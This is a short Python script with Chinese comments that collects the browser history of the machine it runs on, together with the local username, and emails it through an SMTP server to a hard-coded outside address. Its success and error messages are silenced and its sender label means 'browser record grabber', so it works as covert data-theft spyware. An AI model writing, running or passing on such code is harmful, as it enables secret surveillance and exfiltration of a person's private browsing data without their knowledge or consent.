import browserhistory as bh
import smtplib
from email.mime.text import MIMEText
from email.header import Header
import getpass
def sendMail(data):
  # 第三方 SMTP 服务
  mail_host="smtp.163.com"  #设置服务器
  mail_user="<修改为 发送邮件的邮箱>"    # 发送邮箱
  mail_pass="<SMTP服务器开通后的 口令 密钥>"   #口令 
  
  
  sender = '<修改为 发送邮件的邮箱>' # 发送邮箱
  receivers = ['samuraizd@outlook.com']  # 接收邮件，可设置为你的QQ邮箱或者其他邮箱
  
  message = MIMEText(f"用户 {getpass.getuser()} 的浏览器历史记录 \n{data}", 'plain', 'utf-8')
  message['From'] = Header("浏览器记录获取者", 'utf-8')
  message['To'] =  Header("Bojaka", 'utf-8')
  
  subject = "浏览器历史记录"
  message['Subject'] = Header(subject, 'utf-8')
  
  
  try:
      smtpObj = smtplib.SMTP() 
      smtpObj.connect(mail_host, 25)    # 25 为 SMTP 端口号
      smtpObj.login(mail_user,mail_pass)
      smtpObj.sendmail(sender, receivers, message.as_string())
      # print ("邮件发送成功")
      ...
  except smtplib.SMTPException:
      # print ("Error: 无法发送邮件")
      ...

if __name__ == '__main__':
  print('开始')
  data = bh.get_browserhistory()
  str_data = ''
  # 处理一下数据
  for i in data:
    for i_ in data[i]:
      str_data += f'{i_}\n'
  # print(str_data)
    
  sendMail(str_data)
